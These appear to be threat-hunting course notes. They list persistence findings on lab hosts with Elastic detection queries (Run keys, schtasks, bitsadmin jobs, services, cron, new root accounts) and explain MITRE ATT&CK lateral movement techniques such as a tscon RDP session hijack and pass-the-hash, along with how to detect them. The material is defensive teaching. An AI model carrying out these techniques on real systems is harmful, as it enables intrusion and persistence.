The user Administrator on the host eng-wkstn-1 created the object HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\duck with the value of C:\duck.exe. Suspicion is raised any time an executable is located in the root of the C:\ directory.

﻿

Query
agent.type: winlogbeat AND event.module: sysmon AND ((event.code: 13 AND winlog.event_data.TargetObject: "*CurrentVersion\Run*") OR (event.code: 1 AND process.pe.original_file_name: reg.exe AND process.command_line: "*CurrentVersion\Run*"))
﻿

False Positives
﻿

The user eng_user01 created a run key for OneDrive and, at first glance, it may look suspicious because the OneDrive.exe file it is pointing to is located in C:\Users\eng_user01\AppData\Local\Microsoft\OneDrive\OneDrive.exe. Normally, legitimate programs are installed in the Program Files folders, but AppData is often used because it does not require administrator privileges to install programs there.

﻿

Scheduled Tasks
﻿

Description
﻿

The user Administrator on the host eng-wkstn-1 created a scheduled task to execute C:\Users\Administrator\AppData\Local\duck.exe on login. While programs are sometimes installed to AppData locations, they are in a parent folder for the specific program and not dropped in the root of the Local or Roaming folders.

﻿

Query
agent.type: winlogbeat AND event.dataset: process_creation AND event.module: sysmon AND event.code: 1 AND process.pe.original_file_name: schtasks.exe
﻿

False Positives
﻿

There was one event where the schtasks command was run with no flags.

﻿

BITS Jobs
﻿

Description
﻿

The user Administrator on the host eng-wkstn-1 used bitsadmin.exe to configure a BITSAdmin job that executed goose.exe that reaches out to the attacker’s machine in an attempt to open a backdoor. 

﻿

Query
agent.type: winlogbeat AND event.dataset: process_creation AND process.pe.original_file_name: "bitsadmin.exe" AND process.command_line: ("*Transfer*" OR "*Create*" OR "*AddFile*" OR "*SetNotifyCmdLine*" OR "*SetMinRetryDelay*" OR "*Resume*")
﻿

False Positives
﻿

No false positives appeared.

﻿

Services
﻿

Description
﻿

The user Administrator on the host eng-wkstn-1 attempted to start the suspicious service C:\Program Files\go.exe.

﻿

Query
﻿

The following query is used in Kibana's Lens application to take a quick glance at what services were created during the allotted hunt time range:

agent.type: winlogbeat AND event.dataset: system AND event.code: 7045
﻿

Enter the following queries into the Lens:

event.code.keyword
winlog.event_data.ImagePath
﻿

These reveal the suspicious service C:\Program Files\go.exe. Now that the name and path of the service are known, event.code 1 and 13 can be utilized to gather more information.

﻿

False Positives
﻿

No false positives appeared.

﻿

Cron Jobs
﻿

Description
﻿

Several cron jobs were created by the users JCTE and root on the host cups-server. These actions need further investigation by gaining direct access to the cups-server host or by using a tool like OSquery to query the cron jobs on the host. 

﻿

Query
agent.type: auditbeat AND event.module: auditd AND tags: cron AND event.action: ("renamed" OR "changed-file-ownership-of")
﻿

False Positives
﻿

No false positives appeared.

﻿

Account Creation
﻿

Description
﻿

A new user, larry, was created on the cups-server and was provided root privileges. This action requires validation to ensure it was approved activity. It can also be used as a jumping-off point for a deeper investigation to see if the user larry performed any suspicious activity after creation.

﻿

Query
agent.type: auditbeat AND event.module: system AND event.dataset: user AND event.action: user_added
﻿

False Positives
﻿

No false positives appeared.

﻿

UNIX Profile Configuration Modification
﻿

Description
﻿

The user root modified /etc/profile on the cups-server host. This action requires validation to ensure it was approved activity.

﻿

Query
agent.type: auditbeat AND event.dataset: file AND event.action: (updated OR attributes_modified) AND file.path: "/etc/profile"
﻿

False Positives
﻿

No false positives appeared.


########## M3 L4 ############
############# Recognizing Lateral Movement ############

Lateral Movement TTPs
There are many different techniques that can be used for lateral movement, which is why it is very hard to detect threats moving throughout the network. Lateral movement is often used to enter and control remote systems on a network. In order to achieve their primary objectives, adversaries often explore the network in order to find their target and gain access to it. This often involves pivoting through multiple systems or accounts.  

﻿

The following techniques are all from the MITRE ATT&CK framework. They are some of the most popular lateral movement techniques that adversaries are known to use.

﻿![image](https://github.com/user-attachments/assets/8253a7a8-2d84-4761-9eb4-384bf567d28b)

Exploitation of Remote Services (T1210)
Adversaries are known to exploit remote services to gain access to internal systems, once they are inside a network. Adversaries can exploit software vulnerabilities within a program or the OS to execute code. The goal is to enable access to a remote system.

  

Adversaries first need to determine if the remote system is vulnerable. This is done through discovery methods such as network service scanning to obtain a list of services running on the target to find one that may be vulnerable. This includes methods such as port scans and vulnerability scans. It typically uses tools that the adversary brings onto the system. Services that are commonly exploited are SMB, Remote Desktop Protocol (RDP), and applications that use internal networks such as MySQL (Structured Query Language).

﻿

Detecting software exploitation is difficult because some of the vulnerabilities may cause certain processes or applications to become unstable or crash. Look for abnormal behavior of processes such as suspicious files written to a disk or unusual network traffic. If application logs are accessible, this is a good place to look for evidence of lateral movement.

Remote Services (T1021)
Adversaries that have already compromised and acquired valid user accounts and logins use them to access services specifically designed for remote connections such as SSH, Virtual Network Computing (VNC), and WinRM. If an adversary is able to obtain a set of valid domain credentials for an environment, they can essentially log in to any machine in the environment using remote services such as RDP or SSH.

﻿

If an adversary wishes to exfiltrate data as part of the lateral movement, they can use SMB to remotely connect to a network share. Windows also has hidden network shares that are only accessible to administrators to allow for remote file copy and other administrative functions. Some examples of these network shares include C$, ADMIN$, and IPC$. Adversaries use this technique in conjunction with an administrator-level account to remote access a network over SMB and transfer files or run transferred binaries through remote execution.

﻿

Adversaries take advantage of remote systems using WinRM, which is a Windows service and protocol that allows a user to interact with a remote system. This service can be called with the winrm command using a program such as PowerShell. WinRM can be used to remotely interact with other systems on a network and move laterally throughout an environment. When using WinRM remotely through PowerShell, the child process wsmprovhost.exe is spawned, which indicates an adversary is using remote code execution to laterally move within a network.

﻿

Adversaries take advantage of Windows administration tools, like PSExec, that are used for remotely managing hosts. PSExec is a lightweight standalone utility that allows interactive access to the programs it runs remotely. If an adversary has already obtained compromised credentials and has access to an environment, it can use PSExec to execute commands on another host. PSExec activity involves remote service creation events, which generate Windows Event Identifiers (ID) 7045. When PSExec is used, it spawns a PSEXEVC service, which should also be monitored.

﻿

When discovering or hunting for remote services lateral movement, correlate the use of login activity with remote services executed. Monitor user accounts logged into systems that they normally do not access or accounts that do not normally use remote services. Look for Windows Event ID 4624 pertaining to new user login sessions and Event ID 4648 for an attempted login. In addition, Windows Event IDs 5140 and 5145 relate to opening network shares. Monitor remote login events and any users connected to administrative shares for suspicious activity. 

﻿

In addition, monitor network traffic such as Zeek connection logs and Sysmon Event ID 3 logs. For lateral movement techniques such as using WinRM, the service attempts to connect via port 5985 or 5986. Suspicious traffic often exploits ports such as port 22 for SSH or port 3389 for RDP.

Remote Service Session Hijacking (T1563)
Pre-existing sessions with remote services are often exploited to move laterally in an environment. Users log into a service designed to accept remote connections such as SSH or RDP and establish a session that allows them to maintain continuous access to the remote system. Adversaries take control of these sessions to further their attacks using remote systems. This differs from the Exploitation of Remote Services because adversaries are hijacking an existing session rather than creating a new one using valid accounts. 

﻿

Adversaries hijack a legitimate user's active SSH session by taking advantage of the trust relationships established with other systems via public key authentication. This happens when the SSH agent is compromised or access to the agent's socket is obtained.    

  

Adversaries also hijack legitimate remote desktop sessions to laterally move throughout a network. Typically, a user is notified when someone is trying to take over their RDP session. With System permissions, and using this path for the Terminal Services Console c:\windows\system32\tscon.exe [session number to be stolen], an adversary can hijack a session without the need for credentials or alerting the user. 

﻿

Detecting lateral movement within remote session hijacking is difficult because often the sessions are legitimate. Adversaries do not start a new session like some of the other techniques; they take over an existing one. Often the activity that occurs after a remote login attempt indicates suspicious activity. Monitor for user accounts that are logged into systems not normally accessed or multiple systems that are accessed within a short period of time.

Taint Shared Content (T1080)
Threat actors deliver malicious payloads to remote systems by adding content to shared locations such as network drives or shared code repositories. This content can be corrupted by adversaries when they add malicious programs, scripts, or code to files that are otherwise normal. Once a user opens the file, the malicious content placed by an adversary is triggered, which can cause lateral movement within a network. 

    

For example, malicious code is embedded into a shared Excel spreadsheet. When the infected file is shared within an organization, each machine that opens it becomes infected. This allows adversaries to hunt on each machine for their target data or account to accomplish their desired goals. Both binary and non-binary formats ending with the file extensions .exe, .dll, .bat, and .vbs are targeted.

﻿

Shared content that is tainted is often very difficult to detect. Any processes that write or overwrite many files to a network share are suspicious. Monitor processes that are executed from removable media and for malicious file types that do not typically exist in a shared directory.

Use Alternate Authentication Material (T1550)
If an adversary is unable to acquire valid credentials, they may use alternate authentication methods such as password hashes, kerberos tickets, or application access tokens to move laterally within an environment. Authentication processes require valid usernames and one or more authentication factors such as a password or Personal Identification Number (PIN). These methods generate legitimate alternate authentication material. This material is cached, which allows the system to validate the identity has been successfully verified without asking the user to reenter the authentication factors. The alternate material is maintained by the system, either in the memory or on the disk. Adversaries steal this alternate material through credential access techniques in order to bypass access controls without valid credentials.  

﻿

When local commands are run that are meant to be executed on a remote system, like scheduling remote tasks, the local system passes its token to the remote system. If the currently active user has administrative credentials, they can execute the commands remotely.

﻿

Adversaries also use the Pass-the-Hash (PtH) attacks to steal password hashes in order to move laterally. PtH is a method of authenticating as a user without having access to the user's cleartext password. When performing this technique, valid password hashes are captured using various credential access techniques. Captured hashes are used to authenticate as that user. This allows adversaries to move laterally through an environment. 

﻿

Detecting this lateral movement technique includes monitoring Windows Event IDs 4768 and 4769, which are generated when a user requests a new Ticket-Granting Ticket (TGT) or service ticket. All login and credential use events should also be audited and reviewed. Unusual remote logins, along with other suspicious activity, indicate something malicious is happening. New Technology Local Area Network (LAN) Manager (NTLM) Logon Type 3 authentications that are not associated with a domain logon are also suspicious.

Lateral Movement Tools
Adversaries often use tools that are integrated into the OS to move laterally through the network and deliver malicious payloads.  

PsExec: PsExec is a utility that is part of the Sysinternals suite. It is a command-line administration tool that administrators can use to remotely execute processes and manage systems. 
SCP (Secure Copy): The Unix-like Command-Line Interface (CLI) is used to transfer files between systems. This can be used to move malicious files across the network.
Remote Session Tools (SSH, WinRM, SMB, RDP, WMI): The remote session protocols for Unix-like and Windows OSs. Threat actors may attempt to hijack a session or use compromised valid credentials in order to use these tools to move laterally across the network.
Task Scheduler: A Windows tool used to achieve persistence and continuously execute malicious payloads.
cron: A Linux tool, similar to Task Scheduler, that allows administrators to automate scheduled tasks at a set time. Used to achieve persistence and deliver malicious payloads.





























